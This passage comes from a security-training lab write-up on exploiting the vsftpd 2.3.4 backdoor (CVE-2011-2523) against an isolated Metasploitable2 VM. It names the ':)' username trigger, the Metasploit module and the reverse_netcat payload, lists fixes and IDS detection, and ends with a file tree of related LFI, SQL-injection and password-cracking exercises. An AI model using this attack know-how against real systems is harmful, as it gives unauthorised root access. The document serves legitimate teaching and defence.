| Intrusion detection | A connection to port 6200 immediately following an FTP login containing `:)` is a distinctive, easily-signatured pattern. Network IDS/IPS rules (Snort/Suricata) can detect and alert on it. |

**Why this matters beyond the specific CVE:**

The vsftpd 2.3.4 backdoor is historically significant as an early documented example of a software supply-chain attack — a category now recognised as one of the highest-impact threat vectors (see SolarWinds/SUNBURST 2020, XZ Utils backdoor 2024). The lesson is not specific to vsftpd: any software download, dependency, or update mechanism is a potential insertion point, and checksum verification against an independent trusted source is the minimum viable defence.

---

### Summary

| Item | Detail |
|------|--------|
| CVE | CVE-2011-2523 |
| Vulnerability | Backdoor in vsftpd 2.3.4 tarball; `:)` in username opens root shell on port 6200 |
| Target | Metasploitable2 — 192.168.206.130 (VMnet1 Host-Only, isolated) |
| Attacker | Kali Linux — 192.168.206.128 (same isolated segment) |
| Tool used | Metasploit `exploit/unix/ftp/vsftpd_234_backdoor` + `cmd/unix/reverse_netcat` |
| Result | Full root shell: `uid=0(root) gid=0(root)` on `hostname: metasploitable` |
| Internet reachability of target | Confirmed unreachable (`Network is unreachable` on outbound ping) |
| Fix | Upgrade vsftpd; verify checksums; block port 6200; prefer SFTP over FTP |

---

---

## Repository Contents

All evidence files, raw outputs, and screenshots referenced above are published at:

- **Task 1:** <https://github.com/the-raven-zn/dfcs-bootcamp/tree/main/s10-file-inclusion-and-sqli>
- **Task 2:** <https://github.com/the-raven-zn/dfcs-bootcamp/tree/main/s11-bruteforce-and-cracking>

```
s10-file-inclusion-and-sqli/
├── README.md
├── Part-A-LFI-to-RCE.md
├── Part-B-Manual-SQLi.md
├── Part-C-Remediation.md
└── screenshots/
    ├── 1a-01-lfi-etc-passwd.png
    ├── 1a-02-reverse-shell-connect.png
    ├── 1a-03-reverse-shell-id-pwd.png
    ├── 1a-04-path-disclosure-warnings.png
    ├── 1b-01-sqli-baseline-id1.png
    ├── 1b-02-sqli-single-quote-error.png
    ├── 1b-03-orderby-2-ok.png
    ├── 1b-04-orderby-3-error.png
    ├── 1b-05-union-select-1-2.png
    ├── 1b-06-db-version-enum.png
    ├── 1b-07-groupconcat-tables.png
    ├── 1b-08-column-enum.png
    └── 1b-09-final-creds-dump.png

s11-bruteforce-and-cracking/
├── README.md
├── Part-A-BruteForce.md
├── Part-B-Steganography.md
├── Part-C-ArchiveCracking.md
├── Part-D-CVE.md
└── screenshots/
    ├── 2a-01-low-intruder-results-success.png
    ├── 2a-03-medium-intruder-results-success.png
    ├── 2a-04-medium-cookie-header-positions.png
    ├── 2a-05-high-intruder-positions-with-token.png
    ├── 2a-06-high-intruder-results-all-blocked.png
    ├── 2a-07-high-csrf-token-incorrect-messages.png
    ├── 2b-01-carrier-jpg-properties.png
    ├── 2b-02-steghide-install.png
    ├── 2b-03-baseline-capacity-check.png
    ├── 2b-04-embed-and-filesize-diff.png
    ├── 2b-05-stego-info-and-stegcracker-install.png
    ├── 2b-06-stegcracker-success.png
    ├── 2b-07-extracted-content-verified.png
    ├── 2c-01-zip-creation.png
    ├── 2c-02-zip2john-hash-and-john-crack.png
    ├── 2d-01-metasploitable2-ifconfig.png
    ├── 2d-02-kali-ip-a.png
    ├── 2d-03-kali-ping-metasploitable-success.png
    ├── 2d-04-host-ping-metasploitable-via-vmnet.png
    ├── 2d-05-metasploitable-ping-internet-usage-error.png
    ├── 2d-06-host-ipconfig-separate-subnet.png
    ├── 2d-07-metasploitable-ping-internet-unreachable.png
    ├── 2d-08-nmap-vsftpd-234-confirmed.png
    ├── 2d-09-msf-search-vsftpd-use-module.png
    ├── 2d-10-msf-show-options.png
    ├── 2d-11-msf-payload-list.png
    ├── 2d-12-msf-exploit-shell-opened.png
    ├── 2d-13-root-shell-id-whoami.png
    └── 2d-14-root-shell-uname-hostname.png
```
